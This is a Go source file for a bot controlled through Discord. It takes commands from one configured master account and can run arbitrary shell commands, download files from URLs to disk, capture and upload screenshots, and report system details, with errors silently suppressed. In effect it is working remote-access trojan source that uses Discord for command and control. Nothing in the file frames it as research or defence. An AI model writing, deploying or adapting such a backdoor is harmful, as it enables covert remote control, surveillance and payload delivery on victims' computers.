package main

import (
	"io/ioutil"
	"strings"
	"runtime"
	"os/exec"
	"os"
	"net/http"
	"io"
	"bytes"
	"image/png"

	"github.com/bwmarrin/discordgo"
	"github.com/vova616/screenshot"
)

// Variables used for command line parameters
var (
	Token string
	BotID string
	MasterID string
	BotNAME string

	a_ver string
)

func init() {

	a_ver = "v0.1"

	dat, _ := ioutil.ReadFile("config.txt")
	config_data := strings.Split(string(dat), "\n")

	Token = config_data[0]
	MasterID = config_data[1]
	BotNAME = config_data[2]
}

func main() {
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		//fmt.Println("error creating Discord session,", err)
		return
	}
	u, err := dg.User("@me")
	if err != nil {
		//fmt.Println("error obtaining account details,", err)
	}
	BotID = u.ID
	dg.AddHandler(messageCreate)
	err = dg.Open()
	if err != nil {
		//fmt.Println("error opening connection,", err)
		return
	}
	<-make(chan struct{})
	return
}

func cmd_info(s *discordgo.Session,m *discordgo.MessageCreate){
	_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
}

func cmd_cmd(s *discordgo.Session,m *discordgo.MessageCreate,comman_items []string){
	output, _ := exec.Command(comman_items[2],comman_items[3:]...).CombinedOutput()
	_, _ = s.ChannelMessageSend(m.ChannelID,string(output))
}

func cmd_download(s *discordgo.Session,m *discordgo.MessageCreate,comman_items []string){
	if(len(comman_items)>3){

		out, _ := os.Create(comman_items[3])
		defer out.Close()
		resp, _ := http.Get(comman_items[2])
		defer resp.Body.Close()
		io.Copy(out, resp.Body)

		_, _ = s.ChannelMessageSend(m.ChannelID,"Downloaded")

	}
}

func cmd_screenshot(s *discordgo.Session,m *discordgo.MessageCreate){
	img, err := screenshot.CaptureScreen()

	if(err!=nil){
		_, _ = s.ChannelMessageSend(m.ChannelID,"ERROR")
	}else{
		buff := new(bytes.Buffer)
		png.Encode(buff, img)
		imgdat := bytes.NewReader(buff.Bytes())

		s.ChannelFileSend(m.ChannelID,"screen.png",imgdat)
	}
}


func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	comman_items := strings.Split(m.Content," ")

	if m.Author.ID == BotID || m.Author.ID != MasterID || BotNAME != comman_items[0] {
		return
	}

	if comman_items[1] == "help" {
		_, _ = s.ChannelMessageSend(m.ChannelID, "Commands:\nhelp - Display helps\nhello - returns Hi!\ninfo - displays system info\ncmd - runs command\ndownload - downloads url to file\nver - displays version\nscreenshot - sends a screenshot")
	}

	if comman_items[1] == "hello" {
		_, _ = s.ChannelMessageSend(m.ChannelID, "Hi!")
	}

	if comman_items[1] == "info" {
		cmd_info(s,m)
	}

	if comman_items[1] == "cmd" {
		cmd_cmd(s,m,comman_items)
	}

	if comman_items[1] == "download" {
		cmd_download(s,m,comman_items)
	}

	if comman_items[1] == "ver" {
		_, _ = s.ChannelMessageSend(m.ChannelID,a_ver)
	}

	if comman_items[1] == "screenshot" {
		cmd_screenshot(s,m)

	}

}
